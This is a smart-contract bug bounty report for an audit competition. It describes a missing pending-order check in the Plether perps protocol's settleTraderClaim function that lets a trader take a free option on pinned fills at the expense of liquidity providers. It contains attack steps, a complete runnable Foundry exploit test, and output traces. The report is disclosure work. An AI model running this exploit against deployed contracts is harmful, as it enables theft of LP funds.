# \#99536 [SC-Critical] Missing pending-order check in CfdEngine.settleTraderClaim lets an owner cancel its own pinned open after the fill price is public, leading to direct theft of LP funds

**Submitted on Nov 14th 2026 at 04:53:29 UTC by @deltabear for [Audit Competition | Plether](https://immunefi.com/audit-competition/plether)**

- **Report ID:** #99536
- **Report Type:** Smart Contract
- **Report severity:** Critical
- **Target:** https://github.com/immunefi-team/audit-comp-plether/tree/a82d4fefb02768e5b3bddcc97dee371eee24fea8/packages/perps/src
- **Impacts:**
  - Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield

## Description

## Brief/Intro

The open planner counts a trader's standing claim as collateral when it admits a queued open, but the commit locks only margin and bounty and `settleTraderClaim` has no check for a pending open. An order's fill price is pinned to the first oracle tick after commit and is public about one second later, so the owner sees the price before acting. On a favourable move the owner lets the open fill at the stale tick and closes for a gain the LP pool pays. On an adverse move the owner calls `settleTraderClaim`, the claim leaves the open's margin math, the open fails its initial-margin check and refunds in full, and the claim lands in the owner's withdrawable balance. The owner is any account holding a trader claim. It takes LP USDG on a favourable move and loses nothing on an adverse move.

## Vulnerability Details

The value moves in this order.

1. An order's fill price is pinned to the first Pyth tick after `commitTime` (`PletherOracle.sol:610-614`, `minPublishTime = commitTime + 1`) and `Router.executeOrder` has no caller restriction (`OrderRouter.sol:240-243`), so the owner knows the fill price before choosing whether to execute.

2. A trader claim is an unpaid price payout the pool owes the account (`ACCOUNTING_SPEC.md:50`), recorded when a payout exceeds the pool's free cash (`CfdEngine.sol:849-856`). The planner counts it as reachable collateral when it admits an open: `reachableCollateralAssets = delta.positionMarginAfterOpen + snap.traderClaimBalanceForAccount` (`CfdEnginePlanLib.sol:667`), and the commit screen reads the same term (`CfdEngineLens.sol:312`, `CfdOrderPolicyEvaluatorBase.sol:248`). An open whose own margin is below the initial-margin line is admitted because the claim bridges the gap.

3. The commit reserves only margin and the open bounty (`OrderReservationAccounting.sol:145`). It never reserves the claim, so the claim sits free while the order is queued.

4. `settleTraderClaim` (`CfdEngine.sol:559-590`) checks only `msg.sender == account`, a nonzero claim, and that pool cash covers all claims. It has no check for a pending open that counted the claim. When the account is flat it pays the claim into withdrawable free settlement (`_payTraderClaim`, `CfdEngine.sol:242`, the `settleAssets` branch) and zeroes the balance.

5. At execution the planner re-reads the live snapshot with the claim now zero (`CfdEngineSettlementSidecar.sol:216`). Post-open equity drops by the claim, so `postOpenRiskState.equityAssets <= initialMarginRequirement` and the plan returns `INSUFFICIENT_INITIAL_MARGIN` (`CfdEnginePlanLib.sol:431-436`). That open code maps to `UserInvalid` (`CfdEnginePlanLib.sol:112-128`), a terminal `PlannerRejected` that refunds the committed margin.

The guard that should stop this exists for a live position only. The spec requires paid claim value not to become withdrawable while its value is counted in a collectible cap (`ACCOUNTING_SPEC.md:772-774`). The code honours that for a live position by crediting the PnL pledge (`CfdEngine.sol:239-240`), and takes the other branch for a flat account, which frees the claim and defunds the open that counted it.

### Vulnerable source code

**1. the open's margin check counts the claim as reachable collateral** @ packages/perps/src/libraries/CfdEnginePlanLib.sol:667
```solidity
uint256 reachableCollateralAssets = delta.positionMarginAfterOpen + snap.traderClaimBalanceForAccount;
```

**2. the commit reserves margin only, never the claim** @ packages/perps/src/router/OrderReservationAccounting.sol:145
```solidity
clearinghouse.reserveCommittedOrderMargin(account, orderId, marginDelta);
```

**3. settleTraderClaim gates on the caller only, no pending-order check** @ packages/perps/src/CfdEngine.sol:559-564
```solidity
function settleTraderClaim(
    address account
) external nonReentrant {
    if (msg.sender != account) {
        revert CfdEngine__NotAccountOwner();
    }
```

**4. the flat account pays the claim into withdrawable free settlement** @ packages/perps/src/CfdEngine.sol:238-243
```solidity
pool.payOut(address(clearinghouse), amountAssets);
if (positionRemainsOpen) {
    clearinghouse.creditPnlPledge(account, amountAssets);
} else {
    clearinghouse.settleAssets(account, int256(amountAssets));
}
```

**5. execution re-reads the claim live, now zero** @ packages/perps/src/CfdEngineSettlementSidecar.sol:216
```solidity
snap.traderClaimBalanceForAccount = engine.traderClaimBalanceAssets(account);
```

**6. equity below the init line returns INSUFFICIENT_INITIAL_MARGIN** @ packages/perps/src/libraries/CfdEnginePlanLib.sol:431-436
```solidity
if (
    postOpenRiskState.liquidatable
        || postOpenRiskState.equityAssets <= int256(openState.initialMarginRequirementAssets)
) {
    delta.revertCode = CfdEnginePlanTypes.OpenRevertCode.INSUFFICIENT_INITIAL_MARGIN;
    return delta;
}
```

**7. that code maps to UserInvalid, a terminal refund** @ packages/perps/src/libraries/CfdEnginePlanLib.sol:119-128
```solidity
if (
    code == CfdEnginePlanTypes.OpenRevertCode.DEGRADED_MODE
        || code == CfdEnginePlanTypes.OpenRevertCode.SKEW_TOO_HIGH
        || code == CfdEnginePlanTypes.OpenRevertCode.SOLVENCY_EXCEEDED
        || code == CfdEnginePlanTypes.OpenRevertCode.NUMERIC_DOMAIN_EXCEEDED
) {
    return CfdEnginePlanTypes.ExecutionFailurePolicyCategory.ProtocolStateInvalidated;
}
return CfdEnginePlanTypes.ExecutionFailurePolicyCategory.UserInvalid;
```

## Impact Details

- Impact row: "Direct theft of any user funds, whether at-rest or in-motion, other than unclaimed yield" (Critical). In the matched control below, the only difference between the two runs is the `settleTraderClaim` call, and it moves LP backing by 1,599.998062 USDG on a single adverse round at a 1,000,000 USDG open and a 15 bp move. On the favourable move the LP pool pays the stale-tick gain and the owner withdraws it to its own wallet: the clearinghouse emits an ERC20 transfer of USDG to the attacker EOA. The loss is LP principal held in HousePool, not yield.
- The option scales with the claim. The standing claim in the run is 199,679.999984 USDG. The 1,000,000 USDG open here is conservative: derived from the asserted 20 bps initial-margin rate, that claim admits an open up to about 99,800,000 USDG of notional before the init line binds (199,679.99 / 0.002), so the favourable-exercise payoff scales with the claim, not with a fee band. This bound is arithmetic from the config, not run.
- Prerequisites, all permissionless: a standing trader claim, trading margin, and the public calls `commitOrder`, `settleTraderClaim`, `executeOrder` and `withdraw`. No LP position, no privileged role. A trader claim is documented normal state, created when a winning close or a liquidation residual exceeds free cash (`ACCOUNTING_SPEC.md:35,767`), and it persists after the pool recovers, so the attack runs in a healthy pool.
- The LP never sees it. The claim is settled between the pinned tick and the keeper's execution, inside one keeper-latency window, and the open disappears as a terminal refund.
- Dedup note. This is the same class as the confirmed Critical `lp-settlement-cancels-own-open`, whose root is the pre-audit finding SC-M4 component 3, marked fixed. The program's rule is "For findings marked as fixed or Acknowledged in the reports above, a report on the same root cause is valid only if it shows that the fix at commit a82d4fefb02768e5b3bddcc97dee371eee24fea8 is incomplete or introduces a new bug." SC-M4 component 3 voids an open by changing vault depth so the plan returns `SOLVENCY_EXCEEDED`. This voids an open by removing the per-account trader claim term so the plan returns `INSUFFICIENT_INITIAL_MARGIN`. The lever is `settleTraderClaim`, a different entry point; the removed state is a senior claim liability, not free cash or vault depth; and the fix (reserve the claim or block settle while an open is pending) is in a different place. Locking pool cash does not reserve the claim, so the SC-M4 fix at the scoped commit does not close this.

### Not a known issue or an accepted risk

The protocol's own docs expect this not to happen, so it is not a signed-off tradeoff.

- `SECURITY.md:658-659` says binding orders and the absence of a cancel path stop traders from turning queued intents into free options. This attack is that free option, built with `settleTraderClaim` instead of a cancel.
- `ACCOUNTING_SPEC.md:772-774` says a paid claim must not become withdrawable while its value is still counted in a cap. The code enforces this only for a live position (`CfdEngine.sol:239-240`), so a pending open that counted the same claim is left uncovered.
- The commit reserves margin only (`OrderReservationAccounting.sol:145`) and the reservation model (`ACCOUNTING_SPEC.md:784` onward) never lists the claim, so nothing locks it while the order is queued.
- The Known Limitations list (`SECURITY.md:1328` onward) does not mention settling a claim out of a pending open, and the git history shows the live versus flat split only ever weighed a live position against a flat account, never a flat account with a pending open counting the claim.

## References

Admission counts the claim
- packages/perps/src/libraries/CfdEnginePlanLib.sol:667 - open margin check uses margin plus the trader claim
- packages/perps/src/CfdEngineLens.sol:312 - commit screen uses the same term
- packages/perps/src/CfdOrderPolicyEvaluatorBase.sol:248 - snapshot reads the claim at commit
- packages/perps/src/router/OrderReservationAccounting.sol:145 - commit reserves margin only, not the claim

The lever
- packages/perps/src/CfdEngine.sol:559-590 - `settleTraderClaim`, no pending-order check
- packages/perps/src/CfdEngine.sol:238-243 - flat account pays the claim into withdrawable free settlement
- packages/perps/src/CfdEngine.sol:849-856 - the claim is recorded when a payout exceeds free cash

Terminal refund and public execution
- packages/perps/src/CfdEngineSettlementSidecar.sol:216 - execution re-reads the claim, now zero
- packages/perps/src/libraries/CfdEnginePlanLib.sol:431-436 - equity below init returns INSUFFICIENT_INITIAL_MARGIN
- packages/perps/src/libraries/CfdEnginePlanLib.sol:119-128 - that code is UserInvalid, a terminal refund
- packages/perps/src/OrderRouter.sol:240-243 - `executeOrder`, any caller

Spec
- packages/perps/ACCOUNTING_SPEC.md:463 - the claim is counted for open, increase and withdraw health
- packages/perps/ACCOUNTING_SPEC.md:772-774 - paid claim value must not become withdrawable while already counted in a cap

## Link to Proof of Concept

https://gist.github.com/decies-centena-millia/80609647ee4d96fdc7eb212a4f7b73c5

## Proof of Concept

## Proof of Concept

One test file proves it in the repo's own `packages/perps` Foundry suite at commit `a82d4fef`, on the `FindingBase` fixture with the `DEPLOYMENT.md` release parameters asserted at the top of each test via `_assertReleaseConfig()`. Only USDG and Pyth are the repo's mocks. Every impact number is read back from the system: the order outcome is the Router's own `ExecutionResult.terminalReason`, the LP loss is `pool.totalAssets()` and pool assets net of claims, and the money leaving the protocol is the ERC20 `Transfer` event captured with `vm.recordLogs()`.

- `test_A_favourableExercise_LPfundsLeaveToAttackerWallet` fills the claim-bridged open at the stale tick on a favourable move, the LP pool pays the gain, and the owner withdraws USDG to its own wallet.
- `test_B_voidLever_vs_bindingControl_isolatesBugLoss` runs the same pinned price and the same committed open twice, differing only by the `settleTraderClaim` void, so the LP-backing difference is caused by the lever alone, not by counterparty P&L.

The live v2.0.0 deployment on Arbitrum Sepolia (chain 421614) runs this exact code: `EXTCODEHASH` of the deployed CfdEngine (`0xca18a6...6baa`), HousePool (`0xeb5604...131e`) and MarginClearinghouse (`0xb5b851...b89a`) match the v2.0.0 manifest runtime hashes (`0xa0f8e5be...`, `0x5e684cc8...`, `0xc8e49658...`), and the manifest's `release.sourceCommit` is `1209ca8a`.

Tools: `forge 1.8.5` (commit `51a52c59`), `solc 0.8.35`, `via_ir = true`, optimizer 200 (the repo's unmodified `packages/perps/foundry.toml`). Place the file under `packages/perps/test/findings/X01/settletraderclaim-defunds-pinned-open/` of the shared suite checkout, then from `packages/perps`:

```bash
forge test --match-path "test/findings/X01/settletraderclaim-defunds-pinned-open/SettleTraderClaimSystemDriven.t.sol" -vv
```

### attack step-by-step

1. The attacker holds a standing trader claim of 199,679.999984 USDG, reached through the designed fail-soft path (a winning close whose gain exceeds free cash records a claim), and is flat. The pool is at full health.
2. The attacker commits a 1,000,000 USDG LONG with 1,800 USDG margin, below the 2,000 USDG initial-margin line. The open is admitted because the claim is counted as reachable collateral. The fill tick pins at commit + 1.
3. Favourable move: the attacker does nothing. The open fills at the stale tick, the attacker closes at the better price, the LP pool pays the gain, and the attacker withdraws USDG to its own wallet.
4. Adverse move: the attacker calls `settleTraderClaim`. The claim moves into withdrawable free settlement and the open then fails `INSUFFICIENT_INITIAL_MARGIN` at execution, a terminal `PlannerRejected` that refunds the margin. The round costs at most the open bounty.

### main Attack code

The lever and the system read-back, from `SettleTraderClaimSystemDriven.t.sol`:

```solidity
uint64 oidA = _commitOpen(ATTACKER, CfdTypes.Side.LONG, size, margin);
_advance(2);
vm.prank(ATTACKER);
engine.settleTraderClaim(ATTACKER);                 // THE LEVER: no pending-order check
assertEq(engine.traderClaimBalanceAssets(ATTACKER), 0, "claim settled out from under the pending open");

OrderV3Types.ExecutionResult memory rA = _exec(oidA, PX);
assertEq(uint256(rA.terminalReason), uint256(OrderV3Types.TerminalReason.PlannerRejected),
    "settling the claim voids the SAME open terminally");
```

The control arm commits the identical open at the same price and never calls the lever, so its open fills (`terminalReason` Executed) and its LP backing `eControl` is strictly higher than the attack arm's `eAttack`.

```
plant : hold a standing trader claim, commit a claim-bridged open, let its pinned fill tick print
fire  : on an adverse move call settleTraderClaim, the open dies PlannerRejected and the margin is refunded; on a favourable move let it fill and withdraw the LP-paid gain to the attacker wallet
```

### full poc code, single file, single runnable command

SettleTraderClaimSystemDriven.t.sol (forge 1.8.5, solc 0.8.35, via_ir)
```solidity
// SPDX-License-Identifier: AGPL-3.0
pragma solidity 0.8.35;

import {FindingBase} from "../../FindingBase.sol";
import {CfdTypes} from "@plether/perps/CfdTypes.sol";
import {OrderV3Types} from "@plether/perps/OrderV3Types.sol";
import {Vm} from "forge-std/Vm.sol";
import {console2} from "forge-std/console2.sol";

contract SettleTraderClaimSystemDrivenTest is FindingBase {
    uint256 constant JUNIOR = 50_000_000e6;
    bytes32 constant TRANSFER_SIG = keccak256("Transfer(address,address,uint256)");
    uint256 constant MOVE_BP15 = 15 * 1e4; // 0.15% of PX (PX = 1e8)

    function _mintClaimToAttacker() internal returns (uint256 claim) {
        _warpTo(WEEK_MON_10UTC);
        _fundJunior(LP_J, JUNIOR);
        _fundTrader(ATTACKER, 1_000_000e6);
        _refreshMark(PX);

        uint256 size = _sizeFor(2_000_000e6, PX);
        uint64 oid = _commitOpen(ATTACKER, CfdTypes.Side.LONG, size, 40_000e6);
        _advance(2);
        require(_executed(_exec(oid, PX)), "warm-up open must fill");
        uint256 win = PX - 1000 * 1e4;
        _refreshMark(win);

        uint256 keep = 1_000e6;
        uint256 drain = pool.totalAssets() > keep ? pool.totalAssets() - keep : 0;
        vm.prank(address(engine));
        pool.payOut(address(0xdead), drain);

        _closeNow(ATTACKER, CfdTypes.Side.LONG, _sizeOf(ATTACKER), win);
        claim = engine.traderClaimBalanceAssets(ATTACKER);
        require(claim > 0, "a claim must have been recorded");
        require(_sizeOf(ATTACKER) == 0, "ATTACKER must be flat");
    }

    function _restorePoolToHealth(uint256 claim) internal {
        settlementToken.mint(address(pool), _maxLiability() + claim + JUNIOR);
        pool.accountExcess();
        if (engine.degradedMode()) {
            engine.clearDegradedMode();
        }
        require(!engine.degradedMode(), "pool must be healthy");
        require(pool.totalAssets() >= engine.totalTraderClaimBalanceAssets(), "claims must be serviceable");
    }

    function _usdgTransferredTo(Vm.Log[] memory logs, address to) internal view returns (uint256 total) {
        for (uint256 i = 0; i < logs.length; i++) {
            if (
                logs[i].emitter == address(settlementToken) && logs[i].topics.length == 3
                    && logs[i].topics[0] == TRANSFER_SIG
                    && address(uint160(uint256(logs[i].topics[2]))) == to
            ) {
                total += abi.decode(logs[i].data, (uint256));
            }
        }
    }

    function test_A_favourableExercise_LPfundsLeaveToAttackerWallet() public {
        _assertReleaseConfig();
        uint256 claim = _mintClaimToAttacker();
        _restorePoolToHealth(claim);
        assertEq(engine.traderClaimBalanceAssets(ATTACKER), claim, "claim persists through full pool recovery");
        assertFalse(engine.degradedMode(), "exploit runs in a healthy, non-degraded pool");

        uint256 size = _sizeFor(1_000_000e6, PX);
        uint256 margin = 1_800e6;
        _refreshMark(PX);

        uint64 oid = _commitOpen(ATTACKER, CfdTypes.Side.LONG, size, margin);
        _advance(2);
        require(_executed(_exec(oid, PX)), "pinned open fills at the stale tick PX");

        uint256 favPx = PX - MOVE_BP15;
        _refreshMark(favPx);

        uint256 poolBeforeClose = pool.totalAssets();
        _closeNow(ATTACKER, CfdTypes.Side.LONG, _sizeOf(ATTACKER), favPx);
        uint256 poolAfterClose = pool.totalAssets();
        assertGt(poolBeforeClose, poolAfterClose, "LP pool paid the stale-tick gain (pool.totalAssets fell)");

        uint256 free = clearinghouse.balanceAssets(ATTACKER);
        uint256 walletBefore = settlementToken.balanceOf(ATTACKER);
        vm.recordLogs();
        vm.prank(ATTACKER);
        clearinghouse.withdraw(ATTACKER, free);
        Vm.Log[] memory logs = vm.getRecordedLogs();

        uint256 walletDelta = settlementToken.balanceOf(ATTACKER) - walletBefore;
        uint256 systemTransferred = _usdgTransferredTo(logs, ATTACKER);
        assertEq(walletDelta, free, "attacker EOA USDG balance rose by the withdrawn amount");
        assertEq(systemTransferred, free, "SYSTEM emitted ERC20 Transfer(clearinghouse -> attacker EOA) for the full amount");
        assertGt(systemTransferred, 0, "USDG physically left the protocol to the attacker wallet");

        console2.log("IMPACT (system-read): pool.totalAssets fell over the close by (atoms)", poolBeforeClose - poolAfterClose);
        console2.log("IMPACT (system-emitted Transfer): USDG to attacker EOA wallet (atoms)  ", systemTransferred);
    }

    function test_B_voidLever_vs_bindingControl_isolatesBugLoss() public {
        _assertReleaseConfig();
        uint256 claim = _mintClaimToAttacker();
        _restorePoolToHealth(claim);

        uint256 size = _sizeFor(1_000_000e6, PX);
        uint256 margin = 1_800e6;
        uint256 adversePx = PX + MOVE_BP15;
        _refreshMark(PX);

        uint256 snap = vm.snapshotState();

        uint64 oidC = _commitOpen(ATTACKER, CfdTypes.Side.LONG, size, margin);
        _advance(2);
        OrderV3Types.ExecutionResult memory rC = _exec(oidC, PX);
        assertTrue(_executed(rC), "CONTROL: binding open fills at the pinned tick");
        _refreshMark(adversePx);
        _closeNow(ATTACKER, CfdTypes.Side.LONG, _sizeOf(ATTACKER), adversePx);
        uint256 eControl = _effectiveAssets();
        uint8 reasonControl = uint8(rC.terminalReason);
        vm.revertToState(snap);

        uint256 claimBefore = engine.traderClaimBalanceAssets(ATTACKER);
        uint256 withdrawableBefore = clearinghouse.balanceAssets(ATTACKER);

        uint64 oidA = _commitOpen(ATTACKER, CfdTypes.Side.LONG, size, margin);
        _advance(2);
        vm.prank(ATTACKER);
        engine.settleTraderClaim(ATTACKER);
        assertEq(engine.traderClaimBalanceAssets(ATTACKER), 0, "claim settled out from under the pending open");
        assertGe(
            clearinghouse.balanceAssets(ATTACKER) - withdrawableBefore,
            claimBefore - 1e6,
            "claim value became WITHDRAWABLE free settlement"
        );

        OrderV3Types.ExecutionResult memory rA = _exec(oidA, PX);
        assertEq(
            uint256(rA.terminalReason),
            uint256(OrderV3Types.TerminalReason.PlannerRejected),
            "ATTACK: settling the claim voids the SAME open terminally (system terminalReason)"
        );
        _refreshMark(adversePx);
        uint256 eAttack = _effectiveAssets();

        assertEq(reasonControl, uint8(OrderV3Types.TerminalReason.Executed), "control reason is Executed");
        assertGt(eControl, eAttack, "LP backing is strictly higher when the void lever is removed (same price, same order)");

        console2.log("CONTROL E (LP backing, binding order) atoms", eControl);
        console2.log("ATTACK  E (LP backing, void lever)   atoms", eAttack);
        console2.log("bug-attributable LP loss = E_control - E_attack (atoms)", eControl - eAttack);
    }
}
```

### Output

Raw `-vv` output, verbatim (full logs at `poc/raw-logs/forge-test-vv.log`):

```
Ran 2 tests for test/findings/X01/settletraderclaim-defunds-pinned-open/SettleTraderClaimSystemDriven.t.sol:SettleTraderClaimSystemDrivenTest
[PASS] test_A_favourableExercise_LPfundsLeaveToAttackerWallet() (gas: 15530554)
Logs:
  IMPACT (system-read): pool.totalAssets fell over the close by (atoms) 1499999938
  IMPACT (system-emitted Transfer): USDG to attacker EOA wallet (atoms)   999499896751

[PASS] test_B_voidLever_vs_bindingControl_isolatesBugLoss() (gas: 18250519)
Logs:
  CONTROL E (LP backing, binding order) atoms 50002600001296
  ATTACK  E (LP backing, void lever)   atoms 50001000003234
  bug-attributable LP loss = E_control - E_attack (atoms) 1599998062

Suite result: ok. 2 passed; 0 failed; 0 skipped; finished in 40.89ms (39.38ms CPU time)
```

Test A, the LP-paid gain leaving the protocol to the attacker EOA, verbatim from `poc/raw-logs/forge-test-A-favourable-vvvv.log`:
```
    ├─ [111444] MarginClearinghouse::withdraw(0x00000000000000000000000000000000000A11cE, 999499896751 [9.994e11])
    │   ├─ [29652] MockSettlementToken::transfer(0x00000000000000000000000000000000000A11cE, 999499896751 [9.994e11])
    │   │   ├─ emit Transfer(from: MarginClearinghouse: [0x2e234DAe75C793f67A35089C9d99245E1C58470b], to: 0x00000000000000000000000000000000000A11cE, amount: 999499896751 [9.994e11])
    │   ├─ emit Withdraw(account: 0x00000000000000000000000000000000000A11cE, asset: MockSettlementToken: [0x5615dEB798BB3E4dFa0139dFa1b3D433Cc23b72f], amount: 999499896751 [9.994e11])
```

Test B, excerpts in chronological order from `poc/raw-logs/forge-test-B-control-vvvv.log`. The control arm's open (orderId 3) executes, then the attack arm settles the claim and the same open returns a terminal refund:
```
    └─ ← [Return] ExecutionResult({ orderId: 3, status: 2, terminalReason: 1, pendingReason: 0, receiptHash: 0x6773a6279be451926be2b756bf1b36aa30881049777c3e2649fe71d10054a6ef })
    ├─ [147596] CfdEngine::settleTraderClaim(0x00000000000000000000000000000000000A11cE)
    │   ├─ emit TraderClaimSettled(account: 0x00000000000000000000000000000000000A11cE, amountAssets: 199679999984 [1.996e11])
    └─ ← [Return] ExecutionResult({ orderId: 3, status: 3, terminalReason: 7, pendingReason: 0, receiptHash: 0x344d929b9115212539b3485073c5aae78039cb11ea6123c2267e148147517d14 })
```

`terminalReason` 1 is Executed, 7 is PlannerRejected. Same open id, same pinned price, the only difference is the `settleTraderClaim` call.

```
account                              binding (control)   void (attack)    delta
VICTIM  LP backing E, net of claims  50002600.001296     50001000.003234  -1599.998062 USDG
ATTACKER own USDG wallet (Test A)    0.000000            999499.896751    +999499.896751 USDG, via ERC20 Transfer from the clearinghouse
```

Holding the price and the order fixed, calling `settleTraderClaim` moved 1599.998062 USDG of backing away from the LPs (Test B). On a favourable move the same setup pays the LP gain out to the attacker's own USDG wallet (Test A): the clearinghouse emitted an ERC20 transfer of 999499.896751 USDG to the attacker EOA, and `pool.totalAssets` fell by 1499.999938 USDG over the close.

